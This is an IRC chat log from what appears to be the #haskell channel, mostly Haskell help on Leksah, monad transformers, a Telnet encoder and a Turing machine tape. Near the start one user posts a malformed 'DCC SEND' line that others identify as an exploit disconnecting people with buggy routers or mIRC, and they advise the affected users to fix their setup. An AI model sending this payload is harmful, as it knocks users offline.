13:31:33 <mzero> sure - if you have HP 2011.4.0.0 running on Windows - that's fine - unless you need the newish features in 7.4.1 - the older GHC in HP 2011.4.0.0 isn't actually all that old (despite the huge version jump)
13:31:35 <hpc> will the platform be on time?
13:31:35 <burbul> I also really recommend Leksah, which again works fine under Windows.
13:31:55 <mzero> hpc - release candidates for Mac and "source tar ball" are up
13:32:02 <hpc> cool
13:32:08 * timthelion never figured out Leksah :/
13:32:14 <mzero> expecting windows release candidate soon - so I think we'll make it
13:32:24 <burbul> timthelion: How so?
13:32:25 <hpc> i installed leksah once on windows, couldn't figure out how to uninstall it
13:32:33 <hpc> eventually reformatted
13:32:53 <luite> hpc: you should've bought a new computer, only way you can be sure!
13:32:56 <burbul> Whoa!  I haven't had any headaches uninstalling using the link in the start menu.
13:33:03 <hpc> luite: the formatting was unrelated ;)
13:33:15 <timthelion> burbul: I opened it, and there were all these things.  I'm used to a text editor you see, so having buttons and stuff on the side really confused and frightened me.
13:33:20 <burbul> iit was Leksah that sold me on Haskell
13:33:29 <burbul> I just closed all of that stuff
13:33:48 <burbul> you type, and if you stop typing for a second it compiles in the background and puts squiggly red underlines under every token where something is wrong.
13:33:50 <tertl3> leksah
13:33:52 <noob> ?DCC SEND "DONGUSDONGUSDONGUSPLIIIIIIIIIIIIIIIIING" 0 0 0
13:33:52 <lambdabot> Unknown command, try @list
13:34:00 <burbul> It somehow feels completely different having to go through the manual compile cycle and read error messages
13:34:06 --- mode: ChanServ set +o Cale
13:34:12 <barrucadu> I've not tried Leksah, though I already have emacs set up for haskelling
13:34:17 --- mode: Cale set -o Cale
13:34:27 <tertl3> ok leksah is just what I was looking for :)
13:34:34 <timthelion> burbul: I use ghc's error messages as a todo list.  I purposfully break everything, and keep on compiling till I'm done writting the code.
13:34:41 <alpounet> mzero, hey, will there be another platform for 7.4.2 by the way? i haven't followed up since the beginning of that thread
13:34:57 <burbul> I do much the same thing inside Leksah
13:35:00 <mzero> on a phone call - back in a bit
13:35:03 <burbul> Or rather, I don't purposefully break everything, but
13:35:12 <burbul> I work through each error.
13:35:17 <Cale> danharaj, parcs`, spaceships, mzero, ifox00, kaf3ii: your network setup has the dcc send bug, you might want to look into it
13:36:05 <Cale> (some troll who has now been killed by an ircop posted an exploit for that in here, which seemingly knocked you off the network)
13:36:24 <tertl3> thanks burbul
13:37:29 <burbul>  yr welcome!
13:37:50 <coppro> Anyone here familiar with conduits. Specifically, what does binding in the Pipe monad actually do? Is it composition of two things so that once the first finishes, the second is swapped in for it?
13:37:55 <burbul> I should warn you want the one big downside (that I've encountered)
13:38:08 <burbul> Which is that you can't just have a single Haskell file -- you have to have a cabal project
13:38:14 <burbul> So it's annoying for small things
13:38:25 <burbul> *warn you of
13:38:27 <Ralith> danharaj, parcs`, spaceships, mzero, ifox00, kaf3ii: specifically, your router is at fault--get a new one or replace the firmware.
13:38:47 <arcatan> huh
13:39:16 <timthelion> This exploit just kills the router, or does it actually infect it?
13:39:25 <Cale> Just causes it to disconnect
13:39:41 <Cale> Could also be an mIRC bug in this case, if any of those people are using mIRC.
13:39:57 <Ralith> pretty sure it's a router thing
13:40:00 <Cale> Usually is
13:40:13 <Cale> There are at least two ways to see that behaviour
13:40:23 <timthelion> wouldn't mIRC have released a patch and been done with it?
13:40:59 <jg> @t (<*>)
13:40:59 <lambdabot> Maybe you meant: tell thank you thanks thx ticker time todo todo-add todo-delete topic-cons topic-init topic-null topic-snoc topic-tail topic-tell type . ? @ ft v
13:41:07 <Cale> Yeah, probably. I don't know whether the latest versions are affected by that problem
13:41:19 <timthelion> Cale: according to the change log they are not
13:41:20 <jg> @type (<*>)
13:41:21 <lambdabot> forall (f :: * -> *) a b. (Applicative f) => f (a -> b) -> f a -> f b
13:41:54 <kane77> how long does it take till I start to "get" haskell?
13:41:57 <Cale> lol, buffer overflow dealing with filenames longer than 14 characters. Pretty embarrassing.
13:42:03 <timthelion> OMG non open source software! Scarry.
13:42:22 <Twisol> If I have a state machine with only two states, is using Writer [<output data>] <state> overkill? Is there a more preferable construct?
13:42:25 * timthelion @ mirc
13:42:32 * BMeph is, too
13:42:55 <timthelion> BMeph: is too what?
13:43:00 <Cale> kane77: In my case, it was about 2 months before I started really feeling like I could use it for actual tasks, and about a year before I was "comfortable", whatever that means :D
13:43:11 <jg> @pl \ ma mb -> (pure (flip ($)) <*> mb) <*> (pure (flip ($)) <*> ma <*> (,))
13:43:11 <lambdabot> flip ((<*>) . (pure (flip id) <*>)) . (<*> (,)) . (pure (flip id) <*>)
13:43:14 <BMeph> timthelion: Is using mIRC, too. :)
13:43:24 <timthelion> ah
13:43:34 <Cale> kane77: That was back when there weren't so many good references and tutorials though.
13:43:40 <jg> @unpl flip ((<*>) . (pure (flip id) <*>)) . (<*> (,)) . (pure (flip id) <*>)
13:43:40 <lambdabot> (\ q c -> ((pure (\ e f -> f e)) <*> c) <*> (((pure (\ k l -> l k)) <*> q) <*> ((,))))
13:43:43 <kane77> Cale, I mean I get the basic stuff, but things like ^^ scare me a bit :D
13:44:09 <Cale> kane77: You're not meant to always understand the output of @pl
13:44:35 <jg> :t (.) (.) (flip ($))
13:44:36 <lambdabot> forall (f :: * -> *) a b. (Functor f) => a -> f (a -> b) -> f b
13:45:04 <jmcarthur> Twisol: more context needed
13:45:30 <Twisol> jmcarthur: one moment then
13:45:35 <kane77> Cale, so far I've been just solving project euler problems.. I guess it's time to start some real project..
13:46:16 <coppro> waitaminute
13:46:28 <coppro> did unpl provide a lambda that did flip there?
13:46:36 <jonaskoelker> is it bad style to use ; to put two logically separate "statement" on the same line (like in [lang | lang <- mainstream] )?
13:46:42 <hpaste> Twisol pasted “escapes outgoing Telnet data” at http://hpaste.org/69166
13:46:47 <coppro> oh no wait
13:46:48 <Twisol> jmcarthur: ^
13:46:53 <coppro> it did a lambda that was equivalent to flip ($)
13:47:07 <timthelion> jonaskoelker: why would it be bad style.  Just don't excede 80 chars and be subjective
13:47:18 * BMeph agrees with what seems the general concensus here, that PE doesn't even qualify as a "fake" project.
13:47:32 <dmwit> jonaskoelker: It's pretty unusual.
13:48:05 <Cale> Usually if I'm going to do that, it'll be when the two statements have something to do with each other.
13:48:07 <jonaskoelker> answerOf dmwit /= answerOf timthelion ?
13:48:19 <Twisol> kane77: in my experience - not limited to Haskell - the best thing to do is write something you're familiar with
13:48:20 <jmcarthur> Twisol: looks fine, but you don't appear to be doing anything with Writer that wouldn't be just as convenient with plain tuples
13:48:32 <jmcarthur> Twisol: but still, looks fine to me
13:48:44 <jonaskoelker> cool... thanks for your input :)
13:49:10 <dmwit> jonaskoelker: Style is subjective. Popularity is objective.
13:49:38 <jonaskoelker> Ah...  I guess I have a pretty worthless book about what Strunk and White likes, then ;-)
13:49:53 <dmwit> Subjective does not imply useless.
13:49:58 <jonaskoelker> for instance, congruence between verbs and nouns :)
13:50:15 <jonaskoelker> true
13:51:39 <kane77> Twisol, that leaves me with very few choices :)
13:52:02 <Twisol> kane77: What other languages are you familiar with?
13:52:52 <kane77> Twisol, mostly Java(script), ruby, PLSql etc..
13:54:04 <ion> Java(script)?
13:54:17 <Taneb> Both Java and JavaScript, I'd presume
13:54:25 <timthelion> I have a multi-threaded GTK application, and when I exit, I make sure that I wait long enough to write the file to disk, but then I just kill everything.  Sometimes it tells me SIGSEGV and such stuff.  Is there a risk of really scarry things happening, and random bits of memory getting written to and the world comming to an end?  Or should I ignore these errors?
13:54:26 <Twisol> Conjoining them like that does both a disservice. >_>
13:55:29 <geekosaur> timthelion, a SEGV is always erroneous.
13:55:33 <kane77> ion, yep, both java and javascript :)
13:55:54 <zhulikas> is there an opposite check than :t ? let's say I know what type definition I want and want to write a most minimal function for that
13:55:55 <timthelion> geekosaur: is there actually any danger though?
13:56:00 <zhulikas> check to*
13:56:08 <zhulikas> or of?
13:56:11 <timthelion> zhulikas: there's hoogle :D
13:56:19 * zhulikas derps a perferkt engrish
13:56:35 <Taneb> @djinn (a -> a) -> a -> a
13:56:36 <lambdabot> f a = a
13:56:39 <zhulikas> djinn
13:56:47 <geekosaur> timthelion, I have appropximately zero information on which to determine that
13:56:50 <Taneb> @djinn (a -> a -> b) -> a -> b
13:56:51 <lambdabot> f a b = a b b
13:56:55 <zhulikas> there are also unpl pl
13:56:57 <Twisol> kane77: If it gives you any ideas, I'm working on a Telnet protocol parser as my first project, because I have experience with MUDs and want to write a MUD client.
13:57:22 <jmcarthur> @. pl djinn (a -> a -> b) -> a -> b
13:57:23 <lambdabot> f = join
13:57:29 <Twisol> kane77: I've done it before in Javascript, but since I'm learning Haskell, it's a solved problem for me that I can use to test the waters.
13:57:42 <geekosaur> and tbh I am going to assume that a SEGV is dangerous no matter what, because I absoliutely do not want anyone getting the idea that there are "safe SEGVs that can be ignored".  they are bugs, period.
13:58:19 <timthelion> @djinn [(a->b)]->[c]
13:58:20 <lambdabot> Error: Undefined type []
13:58:36 <timthelion> lambdabot: you OK?
13:58:47 <Taneb> My problem is that Haskell is really the first language I've got any good at
13:58:59 <Taneb> @djinn [a -> b] -> a -> [b]
13:59:00 <lambdabot> Error: Undefined type []
13:59:02 <Lemon> so guys
13:59:04 <timthelion> geekosaur: OK OK.
13:59:13 <Lemon> how do I typecheck mutually recursive definitions?
13:59:52 <kane77> Twisol, I was thinking about file manager.. but I'm not sure if it's a right task for haskell.. other than that I have idea on some webapp, and I've seen there are few web frameworks for haskell..
14:00:18 <timthelion> Lemon: like f :: Int -> Int ; f i = g i ; g :: Int-> Int ; g i = f i ?
14:00:28 <Twisol> kane77: run with whatever's seems interesting, I say. It's hard to do something you aren't excited about.
14:01:13 <timthelion> kane77: I'm writting a GUI app in Haskell.  Hasn't given me any troubles so far, except for GTK+ sometimes sucking at handling threads.
14:02:06 <Lemon> timemage, except without the type annotations, but with more specific constraints
14:02:38 <Lemon> like {foo f = f id; bar = foo}
14:03:03 <kane77> Twisol, timthelion thanks, so I guess there's nothing else stopping me from starting..
14:03:14 <rhapsodh1> i can't get over syntax
14:03:32 <rhapsodh1> how is myFoldl f z xs = foldr step id xs z evaluated?
14:03:33 <Lemon> where I expect the compiler to infer {foo :: ((a -> a) -> b) -> b; bar :: <same as foo>}
14:03:49 <Lemon> well, it's not really mutually recursive
14:04:01 <rhapsodh1> is the second parameter to foldr call is (step id) ?
14:04:14 <Lemon> I more meant to say "how do I type check a set of definitions that may refer to each other"
14:04:27 <Twisol> :t foldr step id
14:04:28 <lambdabot> Not in scope: `step'
14:04:51 <otters> @undo do { mvar <- get; kev <- liftIO (readTVarIO mvar); writeTVar mvar kev }
14:04:52 <lambdabot> get >>= \ mvar -> liftIO (readTVarIO mvar) >>= \ kev -> writeTVar mvar kev
14:05:04 <Twisol> rhapsodh1: to the best of my knowledge, no - step is the first parameter, of foldr, id is the second, xs is the third, z is the fourth
14:05:24 <rhapsodh1> there are only 3 parameters to foldr
14:05:31 <Twisol> like ((((foldr step) id) xs) z)
14:05:37 <rhapsodh1> > :info foldr
14:05:38 <lambdabot>   <no location info>: parse error on input `:'
14:05:45 <rhapsodh1> :/
14:05:52 <tertl3> should one study set theory before studting category theory or does it matter?
14:06:04 <Twisol> if you want (step id), do (foldr (step id) xs z)
14:07:38 <rhapsodh1> Twisol: and how should that evaluation chain run?
14:08:07 <rhapsodh1> i don't get it
14:08:33 <Twisol> rhapsodh1: I don't really understand the question
14:08:46 <rhapsodh1> how will  ((((foldr step) id) xs) z)
14:08:48 <rhapsodh1> work
14:08:51 <Twisol> Currying
14:09:02 <strager> You mean partial function application?
14:09:10 <Twisol> yes
14:09:13 <barrucadu> tertl3: Set theory and category theory are rather different, and so the set theory won't be directly applicable to categories
14:09:19 <rhapsodh1> ok, i'll google :)
14:09:23 <rhapsodh1> thanks
14:09:24 <barrucadu> tertl3: However, it may help you to get into the appropriate mind-set
14:09:37 <tertl3> ah ok
14:10:11 <tertl3> thanks baraacuda
14:10:37 <Twisol> rhapsodh1: any function with two parameters can be looked at as a function with a single parameter that returns another function with a single parameter
14:11:13 <Twisol> take the (+) function, addition. (+) 1 returns a function that adds 1 to its argument.
14:14:22 <dmwit> Twisol: You might consider using a WriterT [Word8] (StateT TelnetState).
14:14:39 <rhapsodh1> Twisol: doesn't this mean that using polish notation should work with (+) ?
14:14:43 <Twisol> dmwit: Why's that?
14:14:50 <hpaste> dmwit annotated “escapes outgoing Telnet data” with “escapes outgoing Telnet data (annotation) (annotation)” at http://hpaste.org/69166#a69168
14:15:19 <barrucadu> rhapsodh1: It does
14:15:21 <Twisol> rhapsodh1: functions named with only symbols are infix by default, but yeah, I think you could do (*) ((+) 1 2) 3
14:15:22 <barrucadu> > (+) 1 2
14:15:23 <lambdabot>   3
14:15:47 <dmwit> Twisol: Because all your functions are TelnetState -> (a, TelnetState), which is State TelnetState a. =)
14:15:48 <rhapsodh1> cool :)
14:15:53 <dmwit> Just lets you pop up a level of abstraction.
14:16:17 <dmwit> e.g. whenCR/whenPlaintext as in that paste.
14:16:35 <Twisol> dmwit: while I have you, can you explain those monad law errors on the paste?
14:16:49 <dmwit> Yes, did you click them?
14:17:01 <Twisol> ..Nope.
14:17:04 <pooya72> hello everyone!
14:17:16 <dmwit> Twisol: I actually like your style better than the suggested style.
14:17:35 <Twisol> I figured it looked better normalized
14:17:36 <dmwit> Twisol: But I like "(writeTelnetByte 0x00 >=> writeTelnetOption cmd opt) CR" even better. =)
14:17:50 <Twisol> :t >=>
14:17:51 <lambdabot> parse error on input `>=>'
14:17:54 <dmwit> :t (>=>)
14:17:54 <Twisol> :t (>=>)
14:17:55 <lambdabot> forall a (m :: * -> *) b c. (Monad m) => (a -> m b) -> (b -> m c) -> a -> m c
14:17:55 <lambdabot> forall a (m :: * -> *) b c. (Monad m) => (a -> m b) -> (b -> m c) -> a -> m c
14:18:11 <Twisol> So… monadic composition?
14:18:13 <dmwit> yes
14:18:21 <Twisol> huh. Okay.
14:18:43 <dmwit> But this is another reason to use the State monad, I think: in my example, that just becomes (>>), and CR doesn't appear at all.
14:19:38 <Twisol> ah wow, you cleaned up that CR junk nicely
14:21:07 <Twisol> and what is this NoMonomorphismRestriction pragma?
14:21:18 <dmwit> Oh, I just noticed that all the writeCRByte clauses start with tell [0x0D], so that could be factored out, too.
14:21:24 <dmwit> ?wiki Monomorphism Restriction
14:21:25 <lambdabot> http://www.haskell.org/haskellwiki/Monomorphism_Restriction
14:22:16 <mzero> alpounet: we haven't committeed to a 7.4.2 based release of Haskell Platform - we'll wait and see how things go - at the very least it would be a month off
14:22:48 <jonaskoelker> @pl monad x >>= \xs -> monad y >>= \ys -> transform xs ys
14:22:48 <lambdabot> (monad y >>=) . transform =<< monad x
14:22:51 <hpaste> dmwit annotated “escapes outgoing Telnet data” with “refined writeCRByte” at http://hpaste.org/69166#a69169
14:22:53 <jonaskoelker> is there something prettier for that?
14:23:18 <dmwit> liftM2 transform (monad x) (monad y)
14:23:31 <jonaskoelker> why so easy? :-)
14:24:05 <alpounet> mzero, alright!
14:24:41 <Twisol> dmwit: Thanks for the help, going to study your changes a bit. :)
14:27:39 <dmwit> Twisol: I have a question.
14:27:44 <Twisol> Yep?
14:27:59 <dmwit> Is this "when (byte /= 0x00) (tell [byte])" part of the telnet protocol, or a hack to allow clearCR to work?
14:28:09 <dmwit> That is, are you really supposed to swallow null bytes after a newline?
14:28:11 <Twisol> It's part of the protocol. A bare CR is not really legal.
14:28:18 <Twisol> The accurate way to encode a CR is CR NUL.
14:28:32 <Twisol> unless you're using the end of line sequence, which is CR NL
14:29:37 <dmwit> But if I writeTelnetString [0x0D,0x00], this will truncate that to just tell [0x0D]. Are you sure that's right?
14:30:26 <burbul> Am I right in thinking there is no observable difference between 'WriteT A StateT B' and 'StateT B WriteT A'?
14:30:36 <Twisol> You're right, I have something mixed up. Uno momento.
14:30:45 <dmwit> Yes, Writer, Reader, and State commute.
14:30:48 <burbul> thanks
14:30:58 <magicman> @unmtl WriteT A (StateT B) a
14:30:58 <lambdabot> WriteT A (StateT B) a
14:31:07 <magicman> @unmtl WriterT A (StateT B) a
14:31:08 <lambdabot> Plugin `unmtl' failed with: `StateT B (a, A)' is not applied to enough arguments.
14:31:11 <dmwit> ?unmtl WriterT a (StateT b) c
14:31:11 <lambdabot> Plugin `unmtl' failed with: `StateT b (c, a)' is not applied to enough arguments.
14:31:14 <burbul> what does unmtl do?
14:31:17 <magicman> @unmtl WriterT A (State B) a
14:31:17 <lambdabot> B -> (a, A, B)
14:31:20 <dmwit> Oh, whoops.
14:31:20 <burbul> ah
14:31:28 <magicman> @unmtl StateT B (Writer A) a
14:31:28 <lambdabot> B -> (a, B, A)
14:31:40 <burbul> Why do we get out a triple rather than a pair nested inside a pair?
14:31:54 <dmwit> Because ?unmtl massages the type to make it look nicer than it really is.
14:31:57 <burbul> ah
14:31:58 <magicman> That's just something @unmtl does, apparently.
14:32:07 <burbul> :t runStateT
14:32:08 <lambdabot> forall s (m :: * -> *) a. StateT s m a -> s -> m (a, s)
14:32:31 <hpaste> Twisol annotated “escapes outgoing Telnet data” with “refined writeCRByte (annotation)” at http://hpaste.org/69166#a69170
14:32:35 <burbul> :t runWriterT . (runStateT m s)
14:32:37 <lambdabot>     Couldn't match expected type `StateT s f a'
14:32:37 <lambdabot>            against inferred type `Expr'
14:32:37 <lambdabot>     In the first argument of `runStateT', namely `m'
14:32:38 <Twisol> dmwit: ^ should be more correct
14:33:15 <dmwit> oh wild
14:33:22 <jonaskoelker> dmwit: do you have another suggestion (than liftM2) when the result is in a different monad?
14:33:50 <dmwit> Is the result monad a transformed version of the input monad?
14:33:56 <dmwit> If so, apply lift liberally.
14:34:03 <dmwit> Otherwise, Don't Do That.
14:34:51 <burbul> @unmtl MaybeT WriteT A (StateT B) a
14:34:51 <lambdabot> WriteT (Maybe A) (StateT B) a
14:35:09 <burbul> @unmtl WriteT A MaybeT (StateT B) a
14:35:09 <lambdabot> WriteT A MaybeT (StateT B) a
14:35:39 <magicman> @unmtl WriterT w (MaybeT (State s)) a
14:35:39 <lambdabot> s -> (Maybe (a, w), s)
14:35:40 <burbul>  @unmtl MaybeT (WriteT A (StateT B)) a
14:35:48 <burbul> yup -- thanks!
14:35:55 <burbul>  @unmtl MaybeT (WriterT A (StateT B)) a
14:36:08 <magicman> You seem to have a space in front of your @unmtl
14:36:09 <burbul>  @unmtl MaybeT (WriterT w (State s)) a
14:36:13 <burbul> @unmtl MaybeT (WriterT w (State s)) a
14:36:13 <jonaskoelker> dmwit: I think what's happening is that I'm crawling up (or down) the monad transformer stack
14:36:13 <lambdabot> s -> (Maybe a, w, s)
14:36:18 <burbul> ah -- thanks again
14:36:19 <jonaskoelker> is that a fair case for lifting?
14:36:55 <dmwit> lift crawls up the stack
14:37:18 <Cale> or, to put it more clearly, lift turns an action in the original monad into an action in the transformed monad.
14:37:38 <Cale> screw this "stack" terminology, it's just confusing :P
14:38:12 <jonaskoelker> so in "runFoo (runBarT (runSpaghettiT ...))", lift goes in the direction from foo to spaghetti?
14:38:49 <jonaskoelker> (the spaghetti transformer, incidentally, obfuscates whatever function gets passed to (>>=))
14:38:50 <Cale> I guess, yes. It turns a Foo action into a BarT Foo action.
14:39:13 <Cale> and will turn a BarT Foo action into a SpaghettiT (BarT Foo) action.
14:39:19 <jonaskoelker> and subsequent lifting turns it into a SpaghettiT (BarT Foo) ... what you said :)
14:40:08 <pygospa> Hey. I've got a problem with my code (http://privatepaste.com/f7b3db2770#). I'm pretty new to Haskell and do not understand why it won't work. This is the error message I get: 03_io.hs:10:12: parse error on input `='
14:40:24 <burbul> There isn't an equivalent of $ for types, is there?
14:40:39 <Cale> if ind = (-1)
14:40:48 <Cale> pygospa: That should probably be == for comparison
14:40:52 <strager> pygospa: You mean ==
14:40:55 <Cale> = is for declaration
14:41:08 <pygospa> Oh -.-
14:41:13 <pygospa> Damn it
14:41:15 <pygospa> Thanks
14:41:33 <zomg> You also seem to be returning a String from menu which has type IO Int, not IO String
14:42:13 <jonaskoelker> pygospa: also, you seem to be using "show m" as a command
14:42:17 <jonaskoelker> :t show
14:42:18 <lambdabot> forall a. (Show a) => a -> String
14:42:19 <zomg> showMenu is also returning incorrect types
14:44:00 <strager> Yes, there are lots of type problems with that code.  But I think pygospa can figure it out after all the syntax errors.  =]
14:45:09 <pygospa> I hope so. If not, I'll return in 2 or 3 hours, regarding how fast I get frustrated again :D
14:46:16 <zezikaro> Could anyone give me advice on this please : http://ideone.com/q4a9k
14:48:09 <zezikaro> it's a turing machine
14:48:26 <Cale> Is it working?
14:48:32 <zomg> "Not done yet lulz" <- I like this message it produces
14:48:36 <Twisol> In "newtype WriterT w m a", what is 'a'? The documentation doesn't say.
14:48:44 <zezikaro> Cale Yeah, ideone executes the code at the bottom btw
14:48:46 <Cale> Twisol: The result of the action
14:48:51 <zezikaro> "input: no
14:48:52 <zezikaro> output:"
14:48:53 <zezikaro> below that
14:48:54 <Cale> Twisol: Rather the type of the result of the action
14:50:04 <burbul> Twisol: so e.g. I have a function
14:50:09 <burbul> write :: RuleExp -> Writer [a] RuleExp
14:50:21 <burbul> which (when evaluated onlywrites some a
14:50:26 <burbul> *which when evaluated on a
14:50:26 <zezikaro> I took the advice of changing my tape representation
14:50:28 <burbul> RuleExp
14:50:33 <Cale> zezikaro: I see that :)
14:50:40 <zezikaro> instead of [char] it's now, left current right
14:50:40 <burbul> Writes some as and then returns a RuleExp
14:50:51 <hayashi> @pl \f g a b -> (f a) <+> (g b)
14:50:52 <lambdabot> flip . (((.) . (<+>)) .)
14:50:58 <burbul> THe last argument in the WriterT is just like the RuleExp in that example
14:51:00 <hayashi> pure pl gold, I see
14:51:03 <dmwit> zezikaro: You're storing "left" backwards!
14:51:04 <Cale> zezikaro: Except that you're still not storing the left side in reverse order like you should be ;)
14:51:20 <Cale> Or perhaps, you *are* storing it in reverse order ;)
14:51:24 <hayashi> @pl \a b -> (f a) <+> (g b)
14:51:25 <lambdabot> (. g) . (<+>) . f
14:51:25 <Cale> hehe
14:51:37 <hayashi> oh, screw that, pointful function it is
14:51:52 <Cale> Either way, it'll work more nicely if the left side is the reverse of how you presently have it
14:52:04 <dmwit> zezikaro: Plus that modifyTape function looks awfully partial on the tapes... better hope your tape is long enough!
14:52:10 <Cale> instead of using init and last, you can just use pattern matching
14:52:20 <Cale> (and don't use head and tail either)
14:52:26 <Twisol> Ohh, I get it now.
14:53:01 <zezikaro> Storing left backwards?
14:53:09 <zezikaro> i append to the right of it
14:53:20 <zezikaro> "A00" '0' "000A"
14:53:22 <dmwit> zezikaro: Well, doing things at the front of a list is much more efficient than doing things at the back of a list.
14:53:39 <dmwit> zezikaro: Since you're always doing things at the back of the "left" list, you might as well reverse it and be much more efficient.
14:53:42 <dmwit> That's the point.
14:53:47 <zezikaro> ah
14:53:52 <zezikaro> i thought it stored a reference to head/tail
14:53:55 <zezikaro> so there's no speed difference
14:54:02 <Cale> init xs is O(length xs) time, as is last xs
14:54:05 <dmwit> No, there's a very big speed difference.
14:54:12 <Cale> xs ++ [c] is O(length xs) time as well
14:54:16 <Twisol> dmwit: So when you rewrote my TelnetWriter, you took the current state out of the action "result" and merged it into the monad itself?
14:54:48 <hpc> Cale: that time is amortized over consuming the result though
14:54:52 <Cale> hpc: right
14:54:54 <hpc> (in the init case)
14:55:01 <Cale> and in the ++ case too
14:55:05 <dmwit> Twisol: Yes, I turned "TState -> Writer TState" into "TState -> Writer (TState, ())" and from there to "WriterT TState ()"
14:55:08 <dmwit> eh
14:55:17 <dmwit> "WriterT (State TState) ()" I mean
14:55:29 <hpc> oh, init is being applied repeatedly
14:55:37 <dmwit> Also I'm being imprecise, which may lead to confusion. Please tell me if you understand immediately so I don't have to spend time getting it precise...
14:55:51 <zezikaro>  <dmwit> zezikaro: Plus that modifyTape function looks awfully partial on the tapes... better hope your tape is long enough!
14:55:55 <zezikaro> what do you mean by that sorry?
14:56:04 <zezikaro> 'partial on the tapes'
14:56:29 <dmwit> zezikaro: Usually, we imagine running our Turing machines on infinite tapes. But your tapes can "run out": if left or right is empty, your machine will crash.
14:56:34 <zezikaro> a turing machine is supposed to have infinite tape, but I don't think that's possible
14:56:35 <dmwit> s/empty/[]/
14:56:38 <zezikaro> yeah
14:56:41 <zezikaro> =[
14:56:42 <dmwit> zezikaro: Sure it is, why not?
14:56:55 <zezikaro> i had a pattern for (Tape [] _ _) and (Tape _ _ [])
14:56:58 <zezikaro> that threw an error
14:57:00 <zezikaro> but i removed it
14:57:07 <dmwit> zezikaro: There's two easy strategies: 1. use an infinite list (another reason to store left the way we're suggesting!) 2. fill in the list as you get to the end with a default symbol
14:57:18 <Twisol> dmwit: got it, thanks
14:57:22 <Cale> zezikaro: this is Haskell, of course you can make the tape infinite :)
14:57:35 <dmwit> zezikaro: You still have patterns for those that throw an error, you're just hiding them in the calls to head/tail/last/init.
14:58:44 <Cale> A curious thing about head and tail is that if you're using them both at the same time, you're probably doing something wrong :)
14:59:07 <hpc> or either of them individually, usually
14:59:42 <zezikaro> So, how can i construct it the right way
14:59:45 <Cale> If you're using only one of them, it might be justified in some way, but if you're using both, you're *definitely* better off with pattern matching
14:59:45 <zezikaro> but then reverse it?
14:59:50 <zezikaro> will i have to do
15:00:10 <zezikaro> Tape (reverse "A0000") 'A' "000A"
15:00:15 <hpaste> kallisti pasted “fixity of boolean logical operators” at http://hpaste.org/69171
15:00:18 <Cale> zezikaro: Think of it not as "in reverse" so much as "in order of increasing distance from the read/write head"
15:00:25 <kallisti> do these fixities seem reasonable?
15:00:54 <Cale> but yeah, if you want "A0000A000A" to be on the tape in order from left to right, that's what you could do
15:01:09 <Cale> However, it's a bit weird to start a Turing machine in the middle of its input anyway
15:01:27 <zezikaro> why?
15:01:43 <kallisti> in bf the initial tape would just be Tape [] '0' (repeat '0')
15:01:47 <hpc> Cale: where else would you start?
15:01:48 <zezikaro> if it's an infinite tape, you can hardly put it to the left or right :D
15:01:49 <Cale> Well, just conventionally, the head usually starts at the left end of the input anyhow
15:02:44 <Cale> zezikaro: I mean, on the left end of the piece of the tape which contains the information that the program is going to read
15:02:49 <kallisti> er '\0'  rather
15:03:03 <Cale> It's probably not going to read the entire tape, because that would mean it never halts.
15:03:09 <burbul> I'm getting an error message I don't understand... could anyone have a quick look at http://hpaste.org/69172 ?
15:03:42 <Cale> So you'll probably have something like  Tape (repeat ' ') 'A' "0000A000A"
15:03:46 <Cale> er
15:03:57 <Cale> So you'll probably have something like  Tape (repeat ' ') 'A' ("0000A000A" ++ repeat ' ')
15:03:59 <Cale> :)
15:04:36 <burbul> oh, wait, think I got it
15:05:46 <Cale> burbul: We'd have to know the type of 'return' which is in scope... it's probably not the standard one?
15:06:07 <zezikaro> Cale On some of the turing machines I looked at a lot started 'in the center'
15:06:14 <zezikaro> like A11110111A
15:06:18 <Saizan> i think it is, WriterT w's return requires Monoid w
15:06:22 <zezikaro> and 0 is the divider between left and right
15:06:27 <zezikaro> and the tape head is at 0
15:06:28 <Cale> zezikaro: in that case, it's fine, just use reverse :)
15:06:36 <Saizan> and w in this case is (Category, [Terminal], SemanticPlus)
15:06:48 <burbul> Why doesn't WriterT w require w to be a Monoid?
15:07:05 <Cale> oh
15:07:06 <Cale> yeah
15:07:06 <kallisti> it does. because tell appends output to an accumulated value
15:07:14 <hpc> burbul: the data type itself doesn't, but the operations do
15:07:15 <kallisti> using mappend
15:07:19 <burbul> I wrote
15:07:23 <Saizan> and return uses mempty
15:07:31 <burbul> type ... = WriterT DerivationEntry ...
15:07:36 <burbul> Rather than
15:07:47 <burbul> type ... = WriterT [DerivationEntry] ...
15:07:50 <burbul> And got a weird bug
15:07:58 <burbul> hpc: right, but why doesn't the type itself have the requirement?
15:08:02 <burbul> It would result in more useful error messages.
15:08:16 <Saizan> there's an instance (Monoid a, Monoid b, Monoid c) => Monoid (a, b, c) btw
15:08:18 <hpc> burbul: it makes writing types that use WriterT a living hell
15:08:27 <burbul> Why?
15:08:34 <burbul> Don't follow that.
15:08:38 <Cale> There's no useful way to impose such requirements on type constructors in Haskell.
15:08:45 <burbul> I see.
15:08:59 <zezikaro> Cale I feel this is the worst bit :: newState = (filter (\x -> stateName x == currentState && (readSymbol x == currentSymbol || readSymbol x == '_')) possibleStates) !! 0
15:09:00 <hpc> and the extension that does it makes things hard
15:09:02 <zezikaro> is there a way to get rid of that?
15:09:04 <Cale> You can impose them on data constructors, and the only way you can do this in H98/2010 is useless.
15:09:12 <burbul> For technical reasons, or is there some moral reason not to have restrictions on type constructors?
15:09:28 <kallisti> practical and moral, I would say.
15:09:34 <burbul> What's the moral one?
15:09:49 <hpc> burbul: if you wrote a function on WriterT that didn't give a rat's ass what the 'w' was, you would still need the Monoid w context
15:10:02 <burbul> I think I don't understand why that's a pain
15:10:16 <kallisti> any generic Writer code must explicitly constrain the parameter to be Monoid, in all code, even if it makes no use of that instance.
15:10:25 <Cale> zezikaro: Use Data.List.find, first of all
15:10:36 <Cale> zezikaro: Or use a Data.Map to hold the rules
15:10:45 <Cale> which would save scanning through the list of rules over and over
15:10:53 <burbul> What kind of code would not make use of the instance?
15:10:56 <hpc> more generally, it turns "what is the type of this" into a slightly non-local problem
15:11:07 <burbul> I can't imagine anything interesting you could do with a WriterT that didn't involve interacting with the monoid
15:11:13 <kallisti> so it a) needlessly restricts the capabilities of the type. There's nothing say that WriterT /has/ to be used with a Monoid parameter (though it typically is because that's how the Monad instance is defined)  b) it forces you to add constraints to a lot of code that doesn't need it.
15:11:36 <Cale> burbul: Well, it would mean having a fancy kind system, which Haskell-as-standardised doesn't have.
15:11:41 <burbul> I think what I'm asking is when it would make sense to consider using WriterT with something that wasn't a monoid
15:11:42 <hpc> burbul: liftWriter :: Writer w a -> WriterT w m a
